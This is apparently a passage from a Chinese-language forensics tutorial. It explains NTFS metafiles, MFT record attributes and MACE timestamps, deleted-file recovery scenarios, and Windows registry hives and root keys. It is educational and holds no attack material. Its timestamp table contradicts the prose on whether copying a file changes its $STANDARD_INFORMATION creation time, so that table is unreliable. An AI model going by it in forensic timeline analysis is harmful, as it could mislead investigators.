&lt;p&gt;当Mft文件的起始部分发生损坏导致文件系统无法挂载时，操作系统可以利用MftMirr来定位关键的元文件，从而为修复工具提供恢复文件系统的可能性&lt;/p&gt;
&lt;h3 id=&#34;logfile&#34;&gt;$LogFile
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;该文件是NTFS日志记录功能的物理载体&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它遵循预写式日志模型，即在对文件系统元数据进行任何实际更改之前，都会先将描述该操作的事务日志记录写入LogFile&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它的核心用途是保证文件系统的一致性和可恢复性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在系统意外崩溃或断电后，NTFS驱动程序可以通过检查LogFile，回滚未完成的事务或完成已记录但未写入的事务，从而防止文件系统结构损坏，也可以用来恢复最近的文件操作历史&lt;/p&gt;
&lt;h3 id=&#34;volume&#34;&gt;$Volume
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是一个存储卷级别信息的元文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它的主要属性中包含了整个卷的元数据，例如卷标、NTFS版本号以及卷的状态标志位&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;操作系统使用此文件来识别卷的属性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其中脏位(Dirty Bit)尤为重要，表示某个数据结构或内存页是否已经被修改过但尚未写回到磁盘或永久存储中，系统在启动时会检查这个标志，如果发现上次关机是“非正常”的，就会触发chkdsk等磁盘检查工具来确保卷的一致性&lt;/p&gt;
&lt;h3 id=&#34;bitmap&#34;&gt;$Bitmap
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bitmap是一个位图文件&lt;/strong&gt;，它的每一个比特位都精确地对应着卷上的一个物理簇&lt;/p&gt;
&lt;p&gt;比特位的值（0或1）用于标记其对应的簇是空闲的还是已被占用&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它被文件系统用于高效地管理磁盘空间分配&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当需要为新文件写入数据时，系统会查询Bitmap来快速找到连续的空闲簇&lt;/p&gt;
&lt;p&gt;当文件被删除时，其占用的簇对应的比特位会被重置为0（空闲）&lt;/p&gt;
&lt;h3 id=&#34;badclus&#34;&gt;$BadClus
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;该文件标记了卷上所有已被检测为物理损坏或不可靠的坏簇&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它以一个稀疏文件的形式存在，其$DATA属性中包含了所有坏簇的位置列表&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它的作用是防止数据丢失&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;文件系统在分配磁盘空间时，会避开BadClus文件中标记的所有簇，以确保用户数据不会被写入到这些已知的物理损坏区域&lt;/p&gt;
&lt;h3 id=&#34;attrdef&#34;&gt;$AttrDef
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;AttrDef是属性定义表，相当于MFT文件记录的模式或模板定义文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它以结构化的形式，列出了NTFS文件系统支持的所有属性类型及其元数据，包括它们的名称、数字ID以及默认特性（如是否可以非常驻）&lt;/p&gt;
&lt;p&gt;此文件由NTFS驱动程序在内部使用，用于在解析任何MFT文件记录时，都能正确地识别和解释其中的各种属性结构，保证了MFT的结构完整性和可扩展性&lt;/p&gt;
&lt;h3 id=&#34;secure&#34;&gt;$Secure
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是一个集中存储卷上所有文件和目录的安全描述符的数据库&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NTFS为了节省空间，并不会在每个MFT记录中都存一份完整的安全描述符（包含用户SID、权限ACL等），而是将唯一的描述符存储在Secure文件中，并赋予其一个ID&lt;/p&gt;
&lt;p&gt;其他MFT记录只需引用这个ID即可&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主要用途是提高权限验证效率和降低安全信息的存储冗余&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过共享安全描述符，可以显著减小MFT的体积，并允许系统更高效地缓存和查询权限信息&lt;/p&gt;
&lt;h3 id=&#34;extend&#34;&gt;$Extend
&lt;/h3&gt;&lt;p&gt;Extend本身是一个目录，它作为NTFS高级功能模块的扩展容器，其下包含了多个用于支持特定功能的元文件&lt;/p&gt;
&lt;p&gt;它为磁盘配额、对象ID、重解析点和变更日志等高级功能提供结构化的存储位置&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它包含以下重要子文件：&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;quota&#34;&gt;$Quota
&lt;/h4&gt;&lt;p&gt;用于记录和管理每个用户在该卷上的磁盘空间使用限制&lt;/p&gt;
&lt;p&gt;它以包含用户SID、空间使用量、警告阈值和硬限制等信息的结构化记录进行存储&lt;/p&gt;
&lt;p&gt;实现Windows的磁盘配额功能，允许管理员为不同用户设置不同的磁盘空间上限&lt;/p&gt;
&lt;h4 id=&#34;objid&#34;&gt;$ObjId
&lt;/h4&gt;&lt;p&gt;为一个卷上的每个文件分配一个全局唯一的对象标识符（GUID），以便快速查找&lt;/p&gt;
&lt;p&gt;主要被分布式链接跟踪等系统服务使用，确保即使用户将文件移动或重命名，依赖该文件的快捷方式等依然能找到它&lt;/p&gt;
&lt;h4 id=&#34;reparse&#34;&gt;$Reparse
&lt;/h4&gt;&lt;p&gt;记录了卷上所有设置了重解析点的文件或目录&lt;/p&gt;
&lt;p&gt;重解析点允许一个文件或目录的访问被一个特定的驱动程序拦截并进行特殊处理&lt;/p&gt;
&lt;p&gt;它是实现多种高级文件系统功能的基础，例如符号链接、目录联接、卷挂载点以及OneDrive的占位符文件等&lt;/p&gt;
&lt;h4 id=&#34;usnjrnl&#34;&gt;$UsnJrnl
&lt;/h4&gt;&lt;p&gt;其全称为Update Sequence Number Journal，即更新序列号日志&lt;/p&gt;
&lt;p&gt;它是一个高效率的日志，记录了卷上所有文件的所有变更事件，如创建、删除、写入、重命名、权限修改等&lt;/p&gt;
&lt;p&gt;它的主要用户是需要监控文件系统变化的应用程序，如增量备份软件、文件同步服务、以及安全审计工具。在取证分析中，它是还原文件详细活动历史的最重要数据源之一&lt;/p&gt;
&lt;h3 id=&#34;boot&#34;&gt;$Boot
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;该文件是卷的引导扇区的一个精确副本&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它包含了BIOS参数块，详细描述了该分区的物理布局，以及用于启动操作系统的初始引导代码&lt;/p&gt;
&lt;p&gt;其核心用途是在计算机启动时，由BIOS/UEFI读取并执行，以&lt;strong&gt;加载操作系统的引导加载程序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;同时，NTFS驱动程序也需要读取它来理解卷的几何结构&lt;/p&gt;
&lt;h3 id=&#34;upcase&#34;&gt;$UpCase
&lt;/h3&gt;&lt;p&gt;该文件包含了一个完整的、将所有Unicode字符映射到其对应大写形式的转换表，&lt;strong&gt;用于实现NTFS文件名大小写不敏感但大小写保留的特性&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当进行文件名比较或查找时，文件系统会调用这个映射表来确保&lt;code&gt;file.txt&lt;/code&gt;和&lt;code&gt;FILE.TXT&lt;/code&gt;这样的大小写被视为同一个文件&lt;/p&gt;
&lt;h3 id=&#34;recyclebin&#34;&gt;$Recycle.Bin
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这虽然不是一个元数据文件，但它是一个与文件系统紧密相关的、重要的系统隐藏目录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当用户通过图形界面删除文件时，文件并不会被物理删除，而是其MFT记录被修改，使其被移动到Recycle.Bin目录下某个以用户SID命名的子目录中，并被重命名，同时一个索引文件会记录下原始的文件名和路径&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它为用户提供回收站功能，允许恢复被误删除的文件&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;ntfs的关键结构--主文件表mft&#34;&gt;NTFS的关键结构 —— 主文件表MFT
&lt;/h2&gt;&lt;h3 id=&#34;什么是mft&#34;&gt;什么是MFT
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;MFT的全称是MasterFileTable ，即主文件表，它是NTFS文件系统的核心&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果NTFS格式的硬盘分区是图书馆，那么MFT就是这个图书馆的总目录卡片索引柜&lt;/p&gt;
&lt;p&gt;这个索引柜本身也是一个特殊的文件，名为&lt;code&gt;$MFT&lt;/code&gt;，里面存放着一张张的卡片，每一张卡片都详细记录了图书馆里某一本书（即硬盘上的一个文件或文件夹）的所有信息&lt;/p&gt;
&lt;p&gt;没有这个总目录，操作系统就无法找到、访问或管理分区上的任何文件&lt;/p&gt;
&lt;h3 id=&#34;mft-的结构&#34;&gt;MFT 的结构
&lt;/h3&gt;&lt;h4 id=&#34;文件记录&#34;&gt;文件记录
&lt;/h4&gt;&lt;p&gt;MFT 由一系列固定大小的文件记录构成，每个记录都有一个唯一的编号，从 0 开始&lt;/p&gt;
&lt;p&gt;记录的前部是固定的头结构&lt;code&gt;FILE_RECORD_SEGMENT_HEADER&lt;/code&gt;，用于描述该记录的状态（如是否在使用中）&lt;/p&gt;
&lt;p&gt;其余部分则由多个可变长度的属性组成&lt;/p&gt;
&lt;h4 id=&#34;核心属性&#34;&gt;核心属性
&lt;/h4&gt;&lt;p&gt;每个文件记录内部，由多个不同类型的属性来完整描述一个文件，下面介绍几个关键属性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$STANDARD_INFORMATION (0x10)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是存储文件的核心元数据，包括安全描述符、所有者ID，以及一组MACE时间戳&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这组时间戳与文件内容的改变紧密相关，被认为是最稳定的时间戳，其创建时间通常反映了文件数据首次被写入的时间，是构建原始时间线的基准，常被称为MAC(B)时间&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;1. M - Modified (修改时间) —— 文件内容最后一次被修改的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当打开一个文件，编辑其内容并保存后，这个时间戳就会更新&lt;/p&gt;
&lt;p&gt;创建新文件时，它的修改时间与创建时间相同&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;2. A - Accessed (访问时间) —— 文件内容最后一次被访问读取的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;理论上，只要一个程序打开并读取了文件内容（即使没有修改），这个时间戳就应该更新。&lt;/p&gt;
&lt;p&gt;但是在现代Windows系统中（Vista及之后），为了提高性能，默认情况下访问时间的更新是禁用的，因此这个时间戳的参考价值有限，除非管理员手动开启了该功能&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;3. C - Created (创建时间) —— 文件被创建在这个文件系统上的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当一个文件从一个地方&lt;strong&gt;复制&lt;/strong&gt;到另一个地方时，新文件的“创建时间”是复制操作发生的时间，而不是原始文件的创建时间&lt;/p&gt;
&lt;p&gt;但当文件被&lt;strong&gt;移动到同一卷&lt;/strong&gt;（例如从C盘的一个文件夹移动到另一个文件夹）时，创建时间通常不会改变&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:orange&#34;&gt;&lt;strong&gt;4. E - Entry Modified (MFT记录变更时间) —— 该文件在MFT中的记录本身最后一次被修改的时间&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;任何导致文件元数据发生变化的操作都会更新这个时间戳，例如文件重命名、文件大小改变、权限修改等。当然，修改文件内容（更新Modified时间）也同样会更新这个时间戳&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$FILE_NAME (0x30)&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;包括存储文件名、父目录的文件记录号、文件大小，以及&lt;strong&gt;另一组独立的MACE时间戳&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这组时间戳反映的是文件名属性本身的状态&lt;/strong&gt;，当文件被创建、移动或重命名时，这组时间戳会被更新&lt;/p&gt;
&lt;p&gt;通过对比&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;和&lt;code&gt;$FILE_NAME&lt;/code&gt;两组时间戳的差异，可以用来判断文件是原地创建还是从别处复制而来&lt;/p&gt;
&lt;p&gt;一个文件记录可以有多个&lt;code&gt;$FILE_NAME&lt;/code&gt;属性，以支持长文件名、MS-DOS兼容的8.3短文件名与硬链接&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;这两组时间具体变化情况如下表(访问时间在现代Windows系统中默认禁用更新，因此假设其始终不变)：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;操作&lt;/th&gt;
          &lt;th&gt;属性&lt;/th&gt;
          &lt;th&gt;创建时间  (C)&lt;/th&gt;
          &lt;th&gt;修改时间 (M)&lt;/th&gt;
          &lt;th&gt;访问时间 (A)&lt;/th&gt;
          &lt;th&gt;MFT变更时间 (E)&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;原地创建文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;修改文件内容&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;复制文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌ (继承)&lt;/td&gt;
          &lt;td&gt;❌ (继承)&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;移动文件 (同一分区)&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;重命名文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;✅&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;读取文件&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$STANDARD_INFORMATION&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;$FILE_NAME&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
          &lt;td&gt;❌&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$DATA&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其中存储着文件的实际数据，其存储方式有两种：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;常驻数据（存内容）&lt;/strong&gt;：如果文件非常小（通常小于约700字节），其全部数据会直接存储在 MFT 记录内部的&lt;code&gt;$DATA&lt;/code&gt;属性中，无需到磁盘的其他地方去寻找&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;非常驻数据（存指针）&lt;/strong&gt;：如果文件较大，&lt;code&gt;$DATA&lt;/code&gt;属性中存储的则是数据运行/簇列表，这是一系列指针，详细描述了该文件的数据流在磁盘上占用了哪些不连续的簇&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$ATTRIBUTE_LIST&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;它包含一个指针列表，指向存储该文件其他属性的额外MFT记录&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当一个文件的所有属性无法在一个MFT记录中存下时（例如，文件有极多的硬链接或高度碎片化），系统会创建这个属性&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;mft与文件恢复&#34;&gt;MFT与文件恢复
&lt;/h4&gt;&lt;p&gt;当一个文件被删除时，NTFS的操作是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在 MFT 中找到该文件对应的记录，并将其头部的&lt;code&gt;in-use&lt;/code&gt;标志位置为0（未使用），记录本身的内容并不会被立即清除&lt;/li&gt;
&lt;li&gt;在&lt;code&gt;$Bitmap&lt;/code&gt;文件中（跟踪卷上所有簇使用情况的元文件），将该文件数据所占用的磁盘簇标记为未分配&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这种标记删除机制使得数据恢复成为可能，恢复的成功率取决于MFT记录和原始数据簇是否被后续写入的新文件所覆盖&lt;/p&gt;
&lt;p&gt;这就导致下面几种情况：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;恢复场景&lt;/th&gt;
          &lt;th&gt;MFT记录状态&lt;/th&gt;
          &lt;th&gt;文件数据状态&lt;/th&gt;
          &lt;th&gt;可恢复性&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;最佳情况&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完美恢复&lt;/strong&gt;：文件名、元数据和文件内容全部可以恢复&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;一般情况&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;部分被覆盖&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;部分恢复&lt;/strong&gt;：文件名和元数据可恢复，但文件内容不完整或已损坏&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;情况三&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完全被覆盖&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;仅元数据恢复&lt;/strong&gt;：只能恢复文件名、大小、时间戳等“档案”信息，文件内容永久丢失&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;最差情况&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;被覆盖&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好或部分完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;部分恢复&lt;/strong&gt;：文件名和元数据永久丢失，但文件内容本身可以从磁盘的“未分配空间”中被恢复出来&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;常驻数据&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完好&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;数据在MFT记录中&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;完美恢复&lt;/strong&gt;：由于文件数据本身就存储在MFT记录中，只要MFT记录未被覆盖，即使磁盘数据区被重写，文件内容依然可以被完整恢复&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;注册表&#34;&gt;注册表
&lt;/h1&gt;&lt;h2 id=&#34;什么是注册表&#34;&gt;什么是注册表
&lt;/h2&gt;&lt;p&gt;Windows注册表是整个操作系统的核心数据库，是一个庞大、复杂的层级式数据库&lt;/p&gt;
&lt;p&gt;它存储了操作系统和几乎所有应用程序运行所需的全部配置信息，从硬件驱动的设置、软件的安装路径，到桌面壁纸的图片位置，所有的一切都记录在其中&lt;/p&gt;
&lt;h2 id=&#34;如何打开注册表&#34;&gt;如何打开注册表
&lt;/h2&gt;&lt;p&gt;我们可以使用注册表编辑器：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win+R打开运行窗口，输入regedit，Shift+Ctrl+Enter以管理员模式打开&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;除了直接看注册表，它还有一个简单易用的用户界面——本地组策略，只不过家庭版通常是没有的：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;win+R打开运行窗口，输入gpedit.msc打开&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;注册表的结构&#34;&gt;注册表的结构
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;要分析注册表，我们必须理解它的双层结构：物理层和逻辑层&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;注册表的配置单元物理层---hive&#34;&gt;注册表的配置单元（物理层 - HIVE）
&lt;/h3&gt;&lt;p&gt;在Windows9x中，注册表文件的数据信息保存在system.dat（系统）和user.dat（用户）中&lt;/p&gt;
&lt;p&gt;但到了WindowsNT，注册表并不是一个单一的大文件，而是由一组名为配置单元 (Hive)的独立文件组成的&lt;/p&gt;
&lt;p&gt;这些是存储在硬盘上的真实文件，在系统运行时被加载到内存中，下面是几个常见的：&lt;/p&gt;
&lt;h4 id=&#34;system&#34;&gt;SYSTEM
&lt;/h4&gt;&lt;p&gt;存储核心的系统硬件配置、服务列表、启动设置&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SYSTEM&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;software&#34;&gt;SOFTWARE
&lt;/h4&gt;&lt;p&gt;存储操作系统和已安装软件的全局配置信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SOFTWARE&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;sam&#34;&gt;SAM
&lt;/h4&gt;&lt;p&gt;安全帐户管理器(Security Account Manager)，存储本地用户的账户信息和密码哈希&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SAM&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;security&#34;&gt;SECURITY
&lt;/h4&gt;&lt;p&gt;存储系统范围内的安全策略和用户权限分配&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SECURITY&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;ntuserdat&#34;&gt;NTUSER.DAT
&lt;/h4&gt;&lt;p&gt;每个用户都有一个独立的，存储该用户的个性化设置，如桌面背景、程序历史记录等&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Users\&amp;lt;用户名&amp;gt;\NTUSER.DAT&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;usrclassdat&#34;&gt;UsrClass.dat
&lt;/h4&gt;&lt;p&gt;同样是每个用户一个，存储文件关联和COM类注册信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Users\&amp;lt;用户名&amp;gt;\AppData\Local\Microsoft\Windows\UsrClass.dat&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;amcachehve&#34;&gt;Amcache.hve
&lt;/h4&gt;&lt;p&gt;记录了近期在该系统上运行过的应用程序及其路径、安装时间等信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\appcompat\Programs\Amcache.hve&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;bcd&#34;&gt;BCD
&lt;/h4&gt;&lt;p&gt;存储了系统的启动菜单和配置信息，决定了计算机如何启动操作系统&lt;/p&gt;
&lt;p&gt;没有扩展名，文件名就是BCD，即Boot Configuration Data&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：通常位于系统启动分区，例如 \Boot\BCD&lt;/p&gt;
&lt;h3 id=&#34;注册表的根键逻辑层---hkey&#34;&gt;注册表的根键（逻辑层 - HKEY）
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;regedit.exe&lt;/code&gt;的&lt;code&gt;HKEY_...&lt;/code&gt;开头的顶级文件夹，是操作系统为了方便管理而创建的逻辑视图，被称为根键&lt;/p&gt;
&lt;p&gt;这些根键将不同的Hive文件组合在一起，形成树状结构&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每一个根键都是一个项（文件夹），下面有着各种项，项里又定义着各种键值对（内容）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注册表包括以下五个根键，其中只有HKLM和HKU是真实映射Hive的，其余都是它们的视图：&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-hkey_classes_roothkcr&#34;&gt;1. HKEY_CLASSES_ROOT（HKCR）
&lt;/h4&gt;&lt;p&gt;它负责管理文件的类型关联（决定双击文件用什么程序打开）和 COM 组件的注册信息&lt;/p&gt;
&lt;p&gt;它是&lt;strong&gt;虚拟的、合并而成的视图&lt;/strong&gt;，由&lt;code&gt;HKLM\SOFTWARE\Classes&lt;/code&gt;和&lt;code&gt;HKCU\Software\Classes&lt;/code&gt;这两个键合并而成&lt;/p&gt;
&lt;h4 id=&#34;2-hkey_current_userhkcu&#34;&gt;2. HKEY_CURRENT_USER（HKCU）
&lt;/h4&gt;&lt;p&gt;该根键包括当前登录用户的配置信息，包括环境变量，个人程序以及桌面设置等&lt;/p&gt;
